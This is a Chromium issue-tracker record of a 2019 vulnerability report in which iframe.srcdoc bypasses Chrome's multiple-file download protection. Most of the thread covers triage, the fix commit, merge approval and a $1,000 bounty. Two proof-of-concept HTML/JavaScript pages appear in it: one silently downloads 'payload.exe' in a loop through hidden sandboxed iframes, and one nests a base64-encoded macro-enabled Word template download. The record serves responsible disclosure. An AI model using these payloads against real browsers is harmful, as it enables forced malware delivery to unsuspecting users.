# Security: Multiple file download protection bypass 2

| Field | Value |
|-------|-------|
| **Issue ID** | [40050153](https://issues.chromium.org/issues/40050153) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ti...@gmail.com |
| **Assignee** | ya...@chromium.org |
| **Created** | 2019-09-18 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Chrome has multiple file download protection. But the iframe.srcdoc attribute can bypass this policy.

**VERSION**  

Chrome Version: [77.0.3865.75] + [stable]  

Operating System: [Windows10 1903]

**REPRODUCTION CASE**

if the download function is included in the iframe.srcdoc, it can bypass the Multiple file download protection policy.

POC:

```
<head>  
  <title>Bypass Download</title>  
</head>  
<body>  
  <script>  
    function idown() {  
      iframe = document.createElement("iframe");  
      iframe.srcdoc = `<body><iframe src='http://localhost:8000/payload.exe'></iframe></body>`;  
      iframe.sandbox = "allow-scripts allow-downloads-without-user-activation";  
      iframe.height = "0";  
      iframe.width = "0";  
      iframe.scrolling = "no";  
      document.body.appendChild(iframe);  
    }  
    setInterval(() => {  
      idown();  
    }, 1000);  
  </script>  
</body>  

```

The browser will continue to download the files.

## Timeline

### rs...@chromium.org (2019-09-19)

Thanks for the report. I can confirm this on 79.0.3914.0.

yaoxia@: Are you a good person to look at this (based on 959640)?

[Monorail components: UI>Browser>Downloads]

### ya...@chromium.org (2019-09-19)

I can take a look.

Thanks for the report!

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-09-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/35ebd9d9cd519c4a107f5249624fe2ea4bdd240c

commit 35ebd9d9cd519c4a107f5249624fe2ea4bdd240c
Author: Yao Xiao <yaoxia@chromium.org>
Date: Mon Sep 23 07:48:29 2019

Fix multiple download protection bypass with iframe.srcdoc

Use originating_contents when initiator origin is opaque

Bug: 1005218
Change-Id: I4ea659b5ea1a233ee122c6fe5d48d00d6bbe9dbf
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1814624
Reviewed-by: Min Qin <qinmin@chromium.org>
Commit-Queue: Yao Xiao <yaoxia@chromium.org>
Cr-Commit-Position: refs/heads/master@{#698835}

[modify] https://crrev.com/35ebd9d9cd519c4a107f5249624fe2ea4bdd240c/chrome/browser/download/download_browsertest.cc
[modify] https://crrev.com/35ebd9d9cd519c4a107f5249624fe2ea4bdd240c/chrome/browser/download/download_request_limiter.cc
[modify] https://crrev.com/35ebd9d9cd519c4a107f5249624fe2ea4bdd240c/chrome/browser/download/download_request_limiter.h
[add] https://crrev.com/35ebd9d9cd519c4a107f5249624fe2ea4bdd240c/chrome/test/data/downloads/multiple_download_from_iframe_srcdoc.html


### ti...@gmail.com (2019-09-25)

Add another poc. It seems that this one has also been fixed in win32-release_x64_asan-win32-release_x64-699666.
```
<body>
  <script>
    function odown(){
      obj = document.createElement('object')
      document.body.appendChild(obj)
      obj.data = 'data:text/html;base64,PGhlYWQ+DQogICAgPHNjcmlwdD4NCiAgICAgICAgZnVuY3Rpb24gaWRvd24oKSB7DQogICAgICAgICAgICB2YXIgdXJpID0NCiAgICAgICAgICAgICAgICAnZGF0YTphcHBsaWNhdGlvbi92bmQubXMtd29yZC50ZW1wbGF0ZS5tYWNyb0VuYWJsZWQuMTI7YmFzZTY0LFBHaDBiV3dnZUcxc2JuTTZiejBpZFhKdU9uTmphR1Z0WVhNdGJXbGpjbTl6YjJaMExXTnZiVHB2Wm1acFkyVTZiMlptYVdObElpQjRiV3h1Y3pwNFBTSjFjbTQ2YzJOb1pXMWhjeTF0YVdOeWIzTnZablF0WTI5dE9tOW1abWxqWlRwbGVHTmxiQ0lnZUcxc2JuTTlJbWgwZEhBNkx5OTNkM2N1ZHpNdWIzSm5MMVJTTDFKRlF5MW9kRzFzTkRBaVBqeG9aV0ZrUGp3aExTMWJhV1lnWjNSbElHMXpieUE1WFQ0OGVHMXNQang0T2tWNFkyVnNWMjl5YTJKdmIycytQSGc2UlhoalpXeFhiM0pyYzJobFpYUnpQang0T2tWNFkyVnNWMjl5YTNOb1pXVjBQang0T2s1aGJXVStlM2R2Y210emFHVmxkSDA4TDNnNlRtRnRaVDQ4ZURwWGIzSnJjMmhsWlhSUGNIUnBiMjV6UGp4NE9rUnBjM0JzWVhsSGNtbGtiR2x1WlhNdlBqd3ZlRHBYYjNKcmMyaGxaWFJQY0hScGIyNXpQand2ZURwRmVHTmxiRmR2Y210emFHVmxkRDQ4TDNnNlJYaGpaV3hYYjNKcmMyaGxaWFJ6UGp3dmVEcEZlR05sYkZkdmNtdGliMjlyUGp3dmVHMXNQandoVzJWdVpHbG1YUzB0UGp3dmFHVmhaRDQ4WW05a2VUNDhkR0ZpYkdVK2UzUmhZbXhsZlR3dmRHRmliR1UrUEM5aWIyUjVQand2YUhSdGJEND0nDQogICAgICAgICAgICBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsNCiAgICAgICAgICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoaWZyYW1lKQ0KICAgICAgICAgICAgaWZyYW1lLnNyYyA9IHVyaTsNCiAgICAgICAgICAgIGlmcmFtZS5zYW5kYm94ID0gJ2FsbG93LXRvcC1uYXZpZ2F0aW9uJw0KDQogICAgICAgIH0NCiAgICAgICAgaWRvd24oKQ0KICAgIDwvc2NyaXB0Pg0KPC9oZWFkPg=='
      setTimeout(()=>{obj.remove()},30)
    }
    setInterval(() => {
        odown()
    }, 100);
    
  </script>
</body>
```

### sh...@chromium.org (2019-10-04)

yaoxia: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2019-10-10)

Closing this because the CL in https://crbug.com/chromium/1005218#c3 appears to fully resolve the issue. Please re-open if there is anything more to do.

### sh...@chromium.org (2019-10-12)

[Empty comment from Monorail migration]

### na...@google.com (2019-10-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-15)

Requesting merge to beta M78 because latest trunk commit (698835) appears to be after beta branch point (693954).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-10-15)

This bug requires manual review: We are only 6 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://goto.google.com/chrome-release-branch-merge-guidelines
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), geohsu@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sr...@google.com (2019-10-15)

yaoxia@ can you help answer https://crbug.com/chromium/1005218#c10 for a merge review to M78, .

### ya...@google.com (2019-10-15)

1. Does your merge fit within the Merge Decision Guidelines?
Yes.

2. Links to the CLs you are requesting to merge.
https://chromium-review.googlesource.com/c/chromium/src/+/1814624

3. Has the change landed and been verified on master/ToT?
Yes

4. Why are these changes required in this milestone after branch?
It's a security bug.

5. Is this a new feature?
No.

6. If it is a new feature, is it behind a flag using finch?
N/A

### sr...@google.com (2019-10-15)

Merge approved for M78, branch:3904, Please complete the merge by 12pm PST today as I will be cutting stable RC build at that time

### sr...@google.com (2019-10-15)

merge is compelete on CL https://chromium-review.googlesource.com/c/chromium/src/+/1863156

Removing the merge-approved label

### na...@google.com (2019-10-18)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-10-18)

Congrats! The Panel decided to reward $1,000 for this report

### na...@google.com (2019-10-18)

[Empty comment from Monorail migration]

### ad...@google.com (2019-10-18)

[Empty comment from Monorail migration]

### ad...@google.com (2019-10-18)

tiebuchen@gmail.com Thanks again for the report. How would you like to be credited in the release notes?

### ad...@google.com (2019-10-18)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-10-18)

[Empty comment from Monorail migration]

### ti...@gmail.com (2019-10-18)

Thanks for the reward.
My credit info:
Zhong Zhaochen of andsecurity.cn

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-01-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-01-17)

This issue was migrated from crbug.com/chromium/1005218?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050153)*
